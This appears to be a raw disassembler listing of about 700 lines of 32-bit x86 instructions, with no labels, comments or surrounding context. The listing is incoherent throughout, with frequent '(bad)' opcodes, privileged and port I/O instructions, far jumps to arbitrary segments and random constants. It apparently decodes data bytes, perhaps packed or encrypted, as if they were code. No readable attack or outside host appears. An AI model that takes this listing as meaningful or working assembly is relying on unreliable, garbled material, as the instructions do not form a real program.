  40698e:	addr16 in eax,dx
  406990:	lock inc eax
  406992:	cld    
  406993:	mov    dl,0x37
  406995:	mov    edx,0x9d96bfa0
  40699a:	rcl    DWORD PTR [edi-0x5fce60f],1
  4069a0:	pop    edx
  4069a1:	cmp    BYTE PTR [edx],0x62
  4069a4:	pop    esi
  4069a5:	fsub   DWORD PTR [edi]
  4069a7:	jle    0x406973
  4069a9:	mov    WORD PTR [eax],gs
  4069ab:	add    BYTE PTR [edi-0x56961913],cl
  4069b1:	push   es
  4069b2:	pop    ds
  4069b3:	sbb    eax,0x98dca2e
  4069b8:	dec    esp
  4069b9:	call   0xf7402027
  4069be:	stc    
  4069bf:	push   ebx
  4069c0:	jo     0x406a33
  4069c2:	cdq    
  4069c3:	pop    ecx
  4069c4:	jmp    0xb27b:0xde4d5de3
  4069cb:	xor    al,dh
  4069cd:	icebp  
  4069ce:	jl     0x4069d9
  4069d0:	(bad)  
  4069d2:	mov    al,0x0
  4069d4:	dec    edi
  4069d5:	push   ds
  4069d6:	xchg   edi,eax
  4069d7:	cmp    DWORD PTR [edi+edx*1],esi
  4069da:	ins    BYTE PTR es:[edi],dx
  4069db:	and    BYTE PTR [edx-0x5b9d32fa],ah
  4069e1:	xchg   ecx,eax
  4069e2:	dec    eax
  4069e3:	push   edi
  4069e4:	ret    0xc66c
  4069e7:	outs   dx,DWORD PTR ds:[esi]
  4069e8:	mov    dl,0x61
  4069ea:	mov    ebx,DWORD PTR [edx]
  4069ec:	lea    eax,[edx]
  4069ee:	js     0x406a38
  4069f0:	xlat   BYTE PTR ds:[ebx]
  4069f1:	push   ss
  4069f2:	push   0x373cbd2e
  4069f7:	pop    es
  4069f8:	nop
  4069f9:	adc    ebp,DWORD PTR [esi+esi*4-0x58287af8]
  406a00:	(bad)  
  406a01:	cmp    bh,BYTE PTR [ebx-0x1d]
  406a04:	jno    0x406a75
  406a06:	pop    esp
  406a07:	push   cs
  406a08:	or     BYTE PTR [ebx+ebp*2+0x62],dh
  406a0c:	sub    ebx,DWORD PTR ds:0xb1c49ae2
  406a12:	(bad)  
  406a13:	enter  0xc362,0xd3
  406a17:	xor    BYTE PTR [ebx+0x2],dh
  406a1a:	aas    
  406a1b:	sub    al,0xdb
  406a1d:	xchg   esp,eax
  406a1e:	loopne 0x4069f4
  406a20:	pop    esp
  406a21:	cmp    bh,bl
  406a23:	mov    esp,0xb0ac4482
  406a28:	jp     0x4069ec
  406a2a:	fucompp 
  406a2c:	inc    ebx
  406a2d:	push   es
  406a2e:	out    0x19,al
  406a30:	jnp    0x406a89
  406a32:	mov    bh,0x5f
  406a34:	adc    ebp,DWORD PTR [ecx+0x6d]
  406a37:	jnp    0x406ab2
  406a39:	shr    edi,cl
  406a3b:	xor    al,0x60
  406a3d:	inc    edx
  406a3e:	jecxz  0x4069da
  406a40:	fadd   DWORD PTR [esi]
  406a42:	dec    esi
  406a43:	(bad)  
  406a44:	jmp    0xc43e:0x25caad83
  406a4b:	in     eax,dx
  406a4c:	push   ss
  406a4d:	das    
  406a4e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406a50:	pop    edx
  406a51:	or     eax,0xa0f76ad1
  406a56:	cmp    BYTE PTR es:[ebx-0x30],al
  406a5a:	inc    esp
  406a5b:	cld    
  406a5c:	pop    esp
  406a5d:	push   ss
  406a5e:	jg     0x406a38
  406a60:	fs mov bh,0xa9
  406a63:	lea    esp,[edi]
  406a65:	mov    ebp,0x59cf9270
  406a6a:	mov    WORD PTR [eax],ss
  406a6c:	rcl    BYTE PTR [esi],1
  406a6e:	mov    edx,0xd9474b2c
  406a73:	sub    dh,BYTE PTR [ebx+esi*8-0x16d6f960]
  406a7a:	cld    
  406a7b:	pop    es
  406a7c:	xor    eax,0x95d16f6d
  406a81:	cs (bad) 
  406a83:	int3   
  406a84:	pusha  
  406a85:	rcl    DWORD PTR [eax-0x1d11cbb7],1
  406a8b:	jl     0x406b00
  406a8d:	adc    ecx,DWORD PTR [eax]
  406a8f:	repz xchg edi,eax
  406a91:	pop    ebp
  406a92:	jle    0x406a83
  406a94:	sub    edi,DWORD PTR [edx+edx*4-0x7306fc78]
  406a9b:	jns    0x406b08
  406a9d:	or     DWORD PTR [edx],eax
  406a9f:	mov    esi,DWORD PTR ss:[esi]
  406aa2:	stos   DWORD PTR es:[edi],eax
  406aa3:	pop    esp
  406aa4:	push   ebx
  406aa5:	mov    eax,0x8293427b
  406aaa:	push   esi
  406aab:	sti    
  406aac:	sub    eax,0x73cfac08
  406ab1:	push   ebx
  406ab2:	repz sub al,0x5
  406ab5:	and    eax,0x7418a8d1
  406aba:	push   cs
  406abb:	fstp   st(6)
  406abd:	(bad)  
  406abe:	mov    edi,0x87a8f8e8
  406ac3:	jb     0x406aee
  406ac5:	mov    bl,0x97
  406ac7:	jg     0x406b13
  406ac9:	sbb    al,0x28
  406acb:	mov    al,0xa
  406acd:	cmp    eax,0xb3a5c620
  406ad2:	es inc edi
  406ad4:	push   esp
  406ad5:	pop    ebx
  406ad6:	mov    al,0x26
  406ad8:	xor    al,0x84
  406ada:	xchg   DWORD PTR [edx],esi
  406adc:	sbb    ebx,edx
  406ade:	jmp    0x2812:0x3cbe59ae
  406ae5:	adc    eax,0x8dc5e613
  406aea:	stos   DWORD PTR es:[edi],eax
  406aeb:	mov    al,ch
  406aed:	sbb    eax,0x2ae2fc64
  406af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af3:	sbb    al,0x3e
  406af5:	out    dx,eax
  406af6:	pop    eax
  406af7:	jl     0x406aaf
  406af9:	ss imul esi,ebp,0xffffff85
  406afd:	add    eax,0x2b5dd72c
  406b02:	inc    esi
  406b03:	imul   ebx,DWORD PTR [esi+0xc],0x34
  406b07:	adc    al,0xbb
  406b09:	mov    ds:0xfabec258,eax
  406b0e:	mov    WORD PTR [edx+0x7b09c4a9],gs
  406b14:	data16 seta ah
  406b18:	aas    
  406b19:	mov    DWORD PTR [edi+0xc],edx
  406b1c:	popa   
  406b1d:	pop    edi
  406b1e:	in     eax,dx
  406b1f:	clc    
  406b20:	fidivr DWORD PTR [esi-0x3f7ab4a6]
  406b26:	sbb    edx,esi
  406b28:	test   eax,0x57aeb1a2
  406b2d:	push   ebx
  406b2e:	add    DWORD PTR [ebp-0x8],0x46d89a0f
  406b35:	popa   
  406b36:	mov    esi,0x8a2e623e
  406b3b:	sbb    bh,BYTE PTR [edx]
  406b3d:	pop    ss
  406b3e:	pop    ebp
  406b3f:	fidivr WORD PTR [edx]
  406b41:	shl    BYTE PTR [esi+0xd],1
  406b44:	jmp    0x406b78
  406b46:	and    BYTE PTR [edi+eiz*4-0x10843d28],dl
  406b4d:	scas   eax,DWORD PTR es:[edi]
  406b4e:	clc    
  406b4f:	(bad)  
  406b50:	aam    0xe2
  406b52:	push   eax
  406b53:	stos   DWORD PTR es:[edi],eax
  406b54:	les    eax,FWORD PTR [edi]
  406b56:	ror    DWORD PTR [edx],cl
  406b58:	stos   BYTE PTR es:[edi],al
  406b59:	xchg   ebp,eax
  406b5a:	sub    BYTE PTR [esi],0xe8
  406b5d:	sbb    edx,DWORD PTR [eax+0x69fe1cc9]
  406b63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b64:	push   ebx
  406b65:	(bad)  
  406b66:	ins    DWORD PTR es:[edi],dx
  406b67:	shl    DWORD PTR [ebx-0x4a1f4d83],cl
  406b6d:	outs   dx,BYTE PTR ds:[esi]
  406b6e:	pusha  
  406b6f:	dec    edx
  406b70:	add    bh,bl
  406b72:	cs inc ebp
  406b74:	push   ebp
  406b75:	into   
  406b76:	dec    eax
  406b77:	push   ebp
  406b78:	adc    DWORD PTR [edi+0x15],ebp
  406b7b:	cmp    esp,DWORD PTR [eax-0x4d6d5a3a]
  406b81:	dec    edi
  406b82:	ss sub ch,dh
  406b85:	push   0xaf52e188
  406b8a:	dec    ebp
  406b8b:	stc    
  406b8c:	arpl   WORD PTR [edx-0xf],si
  406b8f:	icebp  
  406b90:	cmc    
  406b91:	pop    ebp
  406b92:	xor    BYTE PTR [edi+0x1e],dh
  406b95:	cmp    bl,BYTE PTR [edi-0x157348a2]
  406b9b:	(bad)  
  406b9c:	lea    ebp,[ecx+0x28670888]
  406ba2:	jecxz  0x406bc8
  406ba4:	je     0x406ba2
  406ba6:	push   edi
  406ba7:	repnz adc eax,DWORD PTR [esi]
  406baa:	shl    bh,cl
  406bac:	in     al,dx
  406bad:	aas    
  406bae:	mov    esp,0x348409e
  406bb3:	loope  0x406bc2
  406bb5:	cmp    DWORD PTR [ecx],0x21
  406bb8:	ins    DWORD PTR es:[edi],dx
  406bb9:	fsubr  DWORD PTR [ebp-0x14fcd9d]
  406bbf:	jmp    0xf4b6:0x8775518b
  406bc6:	bound  ecx,QWORD PTR [esi-0x57]
  406bc9:	das    
  406bca:	test   BYTE PTR ds:0x741339aa,bl
  406bd0:	mov    BYTE PTR [edx+0xabf91c8],ah
  406bd6:	(bad)  
  406bd7:	or     cl,BYTE PTR [eax-0x62]
  406bda:	stos   BYTE PTR es:[edi],al
  406bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bdc:	ja     0x406bde
  406bde:	repnz arpl sp,di
  406be1:	shr    DWORD PTR ds:0xc7693bba,cl
  406be7:	cdq    
  406be8:	pop    esp
  406be9:	sbb    edi,eax
  406beb:	push   ebx
  406bec:	psrld  mm6,QWORD PTR [ebp+0x29918a46]
  406bf3:	push   esp
  406bf4:	mov    ah,0x49
  406bf6:	jge    0x406bcd
  406bf8:	adc    BYTE PTR [edi+0x2b],dl
  406bfb:	inc    ecx
  406bfc:	stc    
  406bfd:	and    BYTE PTR [ebx+0xfe7e745],ah
  406c03:	mov    fs:0x5c758e9d,eax
  406c09:	cmp    BYTE PTR [esi-0xef992f9],0x28
  406c10:	out    0x47,eax
  406c12:	inc    edi
  406c13:	pusha  
  406c14:	inc    esi
  406c15:	cmp    esi,0xc93e0fc6
  406c1b:	mov    ecx,0x51b06cc4
  406c20:	push   ds
  406c21:	pop    ds
  406c22:	jecxz  0x406c3e
  406c24:	pop    eax
  406c25:	retf   
  406c26:	sahf   
  406c27:	pop    es
  406c28:	arpl   WORD PTR ss:[ecx+ecx*8-0x7d7bdf12],bp
  406c30:	pop    ss
  406c31:	mov    bh,0x23
  406c33:	add    edx,ebp
  406c35:	xor    eax,0x115092e2
  406c3a:	rol    edi,1
  406c3c:	cwde   
  406c3d:	xchg   ebp,eax
  406c3e:	js     0x406cbd
  406c40:	cs cmp ecx,esp
  406c43:	cmp    al,0x84
  406c45:	pop    ss
  406c46:	jp     0x406be2
  406c48:	aaa    
  406c49:	xlat   BYTE PTR ds:[ebx]
  406c4a:	addr16 mov eax,ds:0x55da
  406c4e:	or     DWORD PTR [esi+0x61],ebx
  406c51:	popa   
  406c52:	gs stos BYTE PTR es:[edi],al
  406c54:	inc    ecx
  406c55:	icebp  
  406c56:	push   es
  406c57:	mov    eax,0x49c1e6fd
  406c5c:	addr16 xor bh,ah
  406c5f:	sbb    dh,al
  406c61:	ret    0x66a4
  406c64:	das    
  406c65:	retf   
  406c66:	les    eax,FWORD PTR [ecx+0x1a2b9bdc]
  406c6c:	mov    WORD PTR [esp+eax*1],es
  406c6f:	adc    eax,0xc88f4245
  406c74:	mov    BYTE PTR [edi-0xf7c494c],bh
  406c7a:	out    0x81,eax
  406c7c:	(bad)  
  406c7d:	push   ebp
  406c7e:	mov    cl,0x16
  406c80:	aas    
  406c81:	out    dx,al
  406c82:	fcmovnb st,st(5)
  406c84:	jns    0x406c6a
  406c86:	xchg   esp,eax
  406c87:	ret    
  406c88:	add    eax,0xef44f18d
  406c8d:	jle    0x406c34
  406c8f:	adc    eax,0x343bc632
  406c94:	scas   eax,DWORD PTR es:[edi]
  406c95:	inc    ebx
  406c96:	lahf   
  406c97:	mov    ds:0xcfcb50a8,eax
  406c9c:	mov    ebp,0x3f5fd6e
  406ca1:	dec    edx
  406ca2:	cmp    al,0x9e
  406ca4:	add    DWORD PTR [ebx+0x751dccfd],esi
  406caa:	xor    ch,BYTE PTR [edx+ecx*8]
  406cad:	cmp    al,0x8e
  406caf:	adc    eax,DWORD PTR [edx-0x6a]
  406cb2:	shr    BYTE PTR [edx],1
  406cb4:	mov    eax,0x9d485b8a
  406cb9:	rol    DWORD PTR [ebx],cl
  406cbb:	mov    ds:0x15df0258,al
  406cc0:	inc    esp
  406cc1:	mov    al,0xe4
  406cc3:	fcom   QWORD PTR [edi]
  406cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cc6:	mov    dh,0x4d
  406cc8:	imul   esp,DWORD PTR [ebx+0x6d],0x71922d0e
  406ccf:	repz inc ebp
  406cd1:	ret    0xb852
  406cd4:	(bad)  
  406cd5:	mov    esp,0xc6ae764b
  406cda:	inc    esi
  406cdb:	call   0x93c6:0x94b1110d
  406ce2:	and    DWORD PTR [ecx],0x2253cc85
  406ce8:	jno    0x406d4a
  406cea:	pop    ds
  406ceb:	mov    fs,WORD PTR [ebx-0x2a568ee2]
  406cf1:	dec    edi
  406cf2:	mov    esi,0xf74e3b69
  406cf7:	cmp    ecx,DWORD PTR [esp+edx*8+0x68]
  406cfb:	mov    dh,0x5b
  406cfd:	dec    esi
  406cfe:	mov    BYTE PTR [ebp+0x48],0x1e
  406d02:	cdq    
  406d03:	stc    
  406d04:	ins    BYTE PTR es:[edi],dx
  406d05:	retf   0xdf17
  406d08:	fwait
  406d09:	imul   ebp,DWORD PTR [eax],0x98b1d04b
  406d0f:	shl    BYTE PTR [edx+0x627f8449],0x24
  406d16:	xor    DWORD PTR [ebx],ecx
  406d18:	inc    esi
  406d19:	leave  
  406d1a:	or     esp,DWORD PTR [ecx-0x46]
  406d1d:	outs   dx,DWORD PTR ds:[esi]
  406d1e:	in     al,dx
  406d1f:	jmp    0x503f:0xa426ae71
  406d26:	popf   
  406d27:	or     cl,BYTE PTR [ecx+0x4bdbed9a]
  406d2d:	xchg   DWORD PTR [ebp-0x3c],ebx
  406d30:	mul    dh
  406d32:	fmul   QWORD PTR [edi+0x58]
  406d35:	inc    esp
  406d36:	mov    edx,0x60730ffe
  406d3b:	push   eax
  406d3c:	jmp    0x406d0f
  406d3e:	fistp  QWORD PTR [edi-0x44]
  406d41:	cmc    
  406d42:	fstp   TBYTE PTR [ecx+0x32]
  406d45:	les    edi,FWORD PTR [edx]
  406d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d48:	push   0x6e
  406d4a:	mov    DWORD PTR [ebx+0x60],esi
  406d4d:	cli    
  406d4e:	(bad)  
  406d4f:	call   0x6d1b:0x46622974
  406d56:	fsub   st,st(4)
  406d58:	xchg   esp,eax
  406d59:	push   es
  406d5a:	push   edi
  406d5b:	cmp    al,0x47
  406d5d:	mov    esi,0x123e71ee
  406d62:	xor    BYTE PTR [ecx+0x3f],ah
  406d65:	and    ecx,esi
  406d67:	mov    bh,0x53
  406d69:	repnz or ch,BYTE PTR [esi-0x3541c134]
  406d70:	gs loope 0x406da9
  406d73:	repnz lea edi,[edi+0x56bbf0de]
  406d7a:	fs (bad) 
  406d7c:	out    dx,al
  406d7d:	xlat   BYTE PTR ds:[ebx]
  406d7e:	mov    ebx,0x3da9cb18
  406d83:	hlt    
  406d84:	stos   BYTE PTR es:[edi],al
  406d85:	pushf  
  406d86:	aas    
  406d87:	sub    BYTE PTR [edi-0x67a6643],0x39
  406d8e:	lods   eax,DWORD PTR ds:[esi]
  406d8f:	jmp    0x406d64
  406d91:	cmp    eax,0xc97c2c95
  406d96:	sbb    DWORD PTR [ecx+eax*8-0x5d5e9774],0xffffff8a
  406d9e:	fimul  WORD PTR [eax-0x6307d1b]
  406da4:	xor    bl,bl
  406da6:	mov    fs,WORD PTR [ebx-0x62a067bc]
  406dac:	or     eax,DWORD PTR [edx+edx*1]
  406daf:	in     al,dx
  406db0:	inc    eax
  406db1:	shl    DWORD PTR [ecx],0x9b
  406db4:	ins    DWORD PTR es:[edi],dx
  406db5:	out    dx,eax
  406db6:	adc    bl,BYTE PTR [ebx]
  406db8:	sti    
  406db9:	add    BYTE PTR [edi+edx*8-0x6781ff43],cl
  406dc0:	repz loop 0x406d61
  406dc3:	xchg   al,bh
  406dc5:	inc    eax
  406dc6:	js     0x406dff
  406dc8:	xchg   ecx,eax
  406dc9:	jo     0x406e06
  406dcb:	fcmovnb st,st(6)
  406dce:	sub    DWORD PTR [ebx],esp
  406dd0:	jo     0x406d8c
  406dd2:	stos   BYTE PTR es:[edi],al
  406dd3:	lea    edi,[edx]
  406dd5:	fwait
  406dd6:	sbb    eax,0xec72676
  406ddb:	js     0x406e1c
  406ddd:	push   cs
  406dde:	and    BYTE PTR [edx+ebx*4+0x4cd99e64],bh
  406de5:	mov    ds:0xb80f56c3,al
  406dea:	fdiv   DWORD PTR [edi+ecx*2-0x7cc391cd]
  406df1:	sub    DWORD PTR [edx+0x74],0x1ca5faf7
  406df8:	ret    0x11cc
  406dfb:	push   ebx
  406dfc:	(bad)  
  406dfd:	sub    al,0xab
  406dff:	mov    ds:0xbd8100ab,al
  406e04:	retf   
  406e05:	sbb    DWORD PTR [esi+0x6cb9baf7],0x3f47dd3b
  406e0f:	mov    ch,0x8b
  406e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e12:	xchg   BYTE PTR [edx+0x69c6e081],bh
  406e18:	push   esi
  406e19:	inc    ebp
  406e1a:	dec    esi
  406e1b:	pop    eax
  406e1c:	mov    ah,0xb2
  406e1e:	(bad)  
  406e1f:	stc    
  406e20:	loop   0x406e6d
  406e22:	adc    cl,bl
  406e24:	dec    esi
  406e25:	clc    
  406e26:	aad    0x67
  406e28:	mov    ebx,0x49afa495
  406e2d:	retf   
  406e2e:	fild   QWORD PTR [edx-0x35]
  406e31:	pop    esp
  406e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e33:	lea    esi,[ecx]
  406e35:	push   esp
  406e36:	rcr    cl,cl
  406e38:	cdq    
  406e39:	push   ebx
  406e3a:	push   edx
  406e3b:	push   edi
  406e3c:	jo     0x406e9d
  406e3e:	cli    
  406e3f:	add    eax,0x2557184b
  406e44:	cmp    BYTE PTR [ebp+ebp*4+0x5fd74266],bl
  406e4b:	dec    esp
  406e4c:	adc    eax,0x8bb3eb81
  406e51:	xchg   edi,eax
  406e52:	mov    ebp,0x39e070ca
  406e57:	addr16 jmp 0x406e71
  406e5a:	and    BYTE PTR [ecx+0x67],0x86
  406e5e:	arpl   bp,ax
  406e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e61:	repz iret 
  406e63:	gs pop esi
  406e65:	fisub  WORD PTR [edi-0x79]
  406e68:	jl     0x406e28
  406e6a:	popf   
  406e6b:	push   esp
  406e6c:	inc    ebx
  406e6d:	mov    DWORD PTR [edx-0x5d],edi
  406e70:	loop   0x406e80
  406e72:	jo     0x406e0e
  406e74:	popa   
  406e75:	inc    esi
  406e77:	xchg   ebp,eax
  406e78:	cmp    DWORD PTR [eax+edx*8+0x31],eax
  406e7c:	jecxz  0x406e17
  406e7e:	loop   0x406e1d
  406e80:	xchg   ebx,eax
  406e81:	push   es
  406e82:	xchg   edx,eax
  406e83:	(bad)  
  406e84:	cld    
  406e85:	aam    0xb7
  406e87:	inc    edx
  406e88:	loope  0x406e82
  406e8a:	jge    0x406e14
  406e8c:	sub    DWORD PTR [edi+0x2e142adc],edi
  406e92:	addr16 cmp eax,0xfef8422b
  406e98:	cmc    
  406e99:	je     0x406e83
  406e9b:	(bad)  
  406e9c:	cli    
  406e9d:	jle    0x406eb6
  406e9f:	sbb    eax,0x46153602
  406ea4:	in     al,dx
  406ea5:	mov    ah,0xf2
  406ea7:	outs   dx,DWORD PTR ds:[esi]
  406ea8:	jmp    0x406e74
  406eaa:	mov    ah,0x42
  406eac:	outs   dx,BYTE PTR ds:[esi]
  406ead:	shl    BYTE PTR [ecx-0x4cd24f35],1
  406eb3:	sub    ebx,DWORD PTR [ecx+0x1b]
  406eb6:	stos   BYTE PTR es:[edi],al
  406eb7:	fdivr  DWORD PTR [ebx]
  406eb9:	popa   
  406eba:	ficomp WORD PTR [ebp-0x5d]
  406ebd:	fiadd  DWORD PTR ds:0xdcde1fb4
  406ec3:	cmp    bh,BYTE PTR [edi+esi*8]
  406ec6:	pop    edx
  406ec7:	jle    0x406e72
  406ec9:	sub    edi,ebx
  406ecb:	and    BYTE PTR [ecx+0x23716dd0],dh
  406ed1:	(bad)  
  406ed2:	enter  0xddae,0x34
  406ed6:	fsub   DWORD PTR [eax-0x62487f1]
  406edc:	cmp    BYTE PTR [ebx],ah
  406ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406edf:	ret    
  406ee0:	xchg   BYTE PTR ss:[edx+eiz*2],bh
  406ee4:	outs   dx,BYTE PTR ds:[esi]
  406ee5:	mov    ecx,0xeac81744
  406eea:	jnp    0x406ea3
  406eec:	inc    ecx
  406eed:	push   0x5700326
  406ef2:	out    dx,al
  406ef3:	mov    ds:0x52dc1832,al
  406ef8:	mov    bl,0xe7
  406efa:	pop    ds
  406efb:	mov    al,ds:0xf06bbcc
  406f00:	loope  0x406f5c
  406f02:	xchg   ebx,eax
  406f03:	sbb    ebp,DWORD PTR [ebp-0x35d75970]
  406f09:	bound  edx,QWORD PTR [ebp-0x15a73fba]
  406f0f:	pop    edi
  406f10:	imul   esi,edx,0xffffffda
  406f13:	jp     0x406f62
  406f15:	mov    cl,BYTE PTR [ebx]
  406f17:	pop    esi
  406f18:	pushf  
  406f19:	push   es
  406f1a:	sub    edx,DWORD PTR gs:[edi]
  406f1d:	and    edi,edi
  406f1f:	sti    
  406f20:	shl    DWORD PTR [ecx+0x5b019033],cl
  406f26:	fsub   QWORD PTR [edi+0xb]
  406f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f2a:	xor    DWORD PTR [edi-0x8],esp
  406f2d:	shr    ecx,0xa0
  406f30:	(bad)  
  406f31:	jmp    0x406f91
  406f33:	xor    dh,dl
  406f35:	stos   DWORD PTR es:[edi],eax
  406f36:	push   esi
  406f37:	adc    dh,dh
  406f39:	xchg   edx,eax
  406f3a:	or     DWORD PTR [ebp-0x37],esi
  406f3d:	push   ebx
  406f3e:	add    BYTE PTR [edx-0x2a],dh
  406f41:	mov    bh,0xa4
  406f43:	mov    ds:0x4a20598a,al
  406f48:	nop
  406f49:	dec    esp
  406f4a:	jmp    0x602a0866
  406f4f:	mov    ds:0xccc08ede,al
  406f54:	loop   0x406edd
  406f56:	cmp    cl,BYTE PTR [ecx]
  406f58:	aad    0x9e
  406f5a:	dec    ecx
  406f5b:	xor    ebx,DWORD PTR [esi+0x5a]
  406f5e:	push   ds
  406f5f:	out    dx,eax
  406f60:	call   0x9e9b:0xaa23bf01
  406f67:	inc    BYTE PTR [bp+si]
  406f6a:	sbb    ah,BYTE PTR [eax-0x7a]
  406f6d:	pop    eax
  406f6e:	jmp    0x82ee1f8c
  406f73:	adc    eax,0xcdc19c87
  406f78:	dec    ebp
  406f79:	xchg   esi,esi
  406f7b:	(bad)  
  406f7c:	mov    ah,0x6a
  406f7e:	and    BYTE PTR [edx+0x2336e5fd],dh
  406f84:	mov    bl,0x1d
  406f86:	in     al,dx
  406f87:	xchg   DWORD PTR [ecx-0x7f],esi
  406f8a:	pop    ecx
  406f8b:	in     eax,dx
  406f8c:	xor    cl,bl
  406f8e:	jl     0x406fb8
  406f90:	clc    
  406f91:	imul   esi,edi,0xffffff9a
  406f94:	pushf  
  406f95:	pop    esp
  406f96:	icebp  
  406f97:	outs   dx,DWORD PTR ds:[esi]
  406f98:	lods   al,BYTE PTR ds:[esi]
  406f99:	in     eax,0x62
  406f9b:	cmp    ah,BYTE PTR [ebp+0x7d7db67]
  406fa1:	addr16 das 
  406fa3:	clc    
  406fa4:	imul   ebp,edx,0x88902a55
  406faa:	adc    eax,0x2172e6ee
  406faf:	sbb    esi,DWORD PTR [esi+0x70]
  406fb2:	outs   dx,DWORD PTR ds:[esi]
  406fb3:	sbb    al,0x3c
  406fb5:	xchg   edx,eax
  406fb6:	ja     0x407022
  406fb8:	sbb    BYTE PTR [edx-0x6d],dh
  406fbb:	xchg   ebp,eax
  406fbc:	fmulp  st(3),st
  406fbe:	push   0x60
  406fc0:	retf   0x2d78
  406fc3:	fild   WORD PTR [ebx+ebp*4+0x2d]
  406fc7:	fstp   TBYTE PTR [eax+edi*4-0x60a9faa8]
  406fce:	xchg   DWORD PTR [ecx],edi
  406fd0:	sbb    al,0x1b
  406fd2:	xchg   edi,eax
  406fd3:	pop    ebx
  406fd4:	mov    ch,0x49
  406fd6:	mov    esp,0x4ea64b57
  406fdb:	enter  0x8bc0,0xcd
  406fdf:	xchg   edi,eax
  406fe0:	shr    dl,cl
  406fe2:	test   DWORD PTR [ebp-0x26],0xee36f638
  406fe9:	mov    ds:0xb07bde13,eax
  406fee:	fisttp QWORD PTR [eax-0x7eb3a232]
  406ff4:	ins    DWORD PTR es:[edi],dx
  406ff5:	in     al,0xf
  406ff7:	dec    ecx
  406ff8:	inc    eax
  406ff9:	lods   al,BYTE PTR ds:[esi]
  406ffa:	ror    DWORD PTR [edx+0x20],1
  406ffd:	jb     0x406fb5
  406fff:	fbld   TBYTE PTR [ebx+0x1ce4e324]
  407005:	cmp    al,0xe
  407007:	ss inc edi
  407009:	inc    edi
  40700a:	and    eax,0x557e1c33
  40700f:	push   edi
  407010:	lods   al,BYTE PTR ds:[esi]
  407011:	pop    esi
  407012:	sbb    al,0x6d
  407014:	and    ecx,ebx
  407016:	imul   edi,DWORD PTR [ecx+0x2d],0xdf6c4c7a
  40701d:	ret    0xfb54
  407020:	mov    ch,0x61
  407022:	sbb    dl,BYTE PTR [ebp+0x55]
  407025:	lods   eax,DWORD PTR ds:[esi]
  407026:	sub    al,0x98
  407028:	cdq    
  407029:	cld    
  40702a:	sub    edi,DWORD PTR [edi+0x5]
  40702d:	aam    0xe0
  40702f:	dec    esp
  407030:	mov    dl,0xa4
  407032:	mov    ecx,0xc1f4e7c3
  407037:	push   ds
  407038:	inc    eax
  407039:	ins    DWORD PTR es:[edi],dx
  40703a:	mov    esp,0x2a3ea980
  40703f:	outs   dx,BYTE PTR ds:[esi]
  407040:	out    dx,al
  407041:	inc    ebp
  407042:	sub    cl,cl
  407044:	or     BYTE PTR [esi],dh
  407046:	shl    DWORD PTR [edi+0x41],0xc3
  40704a:	jl     0x407004
  40704c:	daa    
  40704d:	std    
  40704e:	sub    eax,0xa3682b57
  407053:	sbb    DWORD PTR [ebp-0x29],edx
  407056:	nop
  407057:	xchg   edi,eax
  407058:	or     BYTE PTR [esi-0x2a],bl
  40705b:	jmp    0x40705d
  40705d:	hlt    
  40705e:	and    BYTE PTR [ebx-0x25],bl
  407061:	inc    ecx
  407062:	sub    cl,0xdb
  407065:	cli    
  407066:	jno    0x407037
  407068:	enter  0xb4d5,0x47
  40706c:	bound  ebx,QWORD PTR [edi+ebx*8-0x5f]
  407070:	sub    ah,BYTE PTR ds:[edi-0x6ca60fb7]
  407077:	xor    al,0xb9
  407079:	out    dx,al
  40707a:	jno    0x4070d2
  40707c:	outs   dx,DWORD PTR ds:[esi]
  40707d:	fwait
  40707e:	add    BYTE PTR [ecx-0x8],dh
  407081:	jb     0x4070ce
  407083:	inc    ebp
  407084:	imul   edi,DWORD PTR [esi+0x63188ef2],0x6f
  40708b:	jno    0x40708f
  40708d:	rcr    BYTE PTR ds:0xeb9f2551,cl
  407093:	jnp    0x407034
  407095:	test   DWORD PTR [edi],0x1bc2768b
  40709b:	sbb    DWORD PTR [ecx+0x686f81b9],ebx
  4070a1:	mov    edx,esp
  4070a3:	in     eax,0xd5
  4070a5:	rol    DWORD PTR [edi],0x46
  4070a8:	inc    edi
  4070a9:	and    BYTE PTR [edi+0x7a],al
  4070ac:	cmp    cl,BYTE PTR ds:0x59b60dd8
  4070b2:	not    BYTE PTR [esi-0x1420ab60]
  4070b8:	mov    dh,BYTE PTR [eax+0x23]
  4070bb:	jns    0x407084
  4070bd:	cs nop
  4070bf:	lea    eax,[eax]
  4070c1:	add    eax,0x35676545
  4070c6:	cmp    DWORD PTR [eax],0x12a05ae9
  4070cc:	loop   0x407098
  4070ce:	fs daa 
  4070d0:	pop    es
  4070d1:	xchg   ebp,eax
  4070d2:	fsub   QWORD PTR [ecx+ebx*4-0x5e891db8]
  4070d9:	pop    esi
  4070da:	lea    esp,[esi]
  4070dc:	xchg   edx,eax
  4070dd:	pop    edi
  4070de:	xchg   ebp,eax
  4070df:	mov    ebx,0x51707357
  4070e4:	outs   dx,DWORD PTR ss:[esi]
  4070e6:	dec    esp
  4070e7:	fwait
  4070e8:	hlt    
  4070e9:	sub    ebx,DWORD PTR [eax]
  4070eb:	jb     0x407167
  4070ed:	inc    eax
  4070ee:	and    eax,0x6bf118e7
  4070f3:	loop   0x4070ba
  4070f5:	sub    edx,DWORD PTR ds:0xff84135e
  4070fb:	jle    0x40710b
  4070fd:	and    dh,dh
  4070ff:	inc    ecx
  407100:	xchg   edi,eax
  407101:	mov    ch,0xd4
  407103:	jmp    0x14fbcee5
  407108:	sbb    al,0x5d
  40710a:	mov    esp,0x9ffcca5c
  40710f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407111:	and    BYTE PTR [ecx],al
  407113:	sbb    ch,BYTE PTR [edi-0x39556a4c]
  407119:	push   0x7a
  40711b:	iret   
  40711c:	push   edi
  40711d:	or     esi,DWORD PTR [esi+0x710e6b51]
  407123:	mov    esp,0xb0a97c1e
  407128:	push   edx
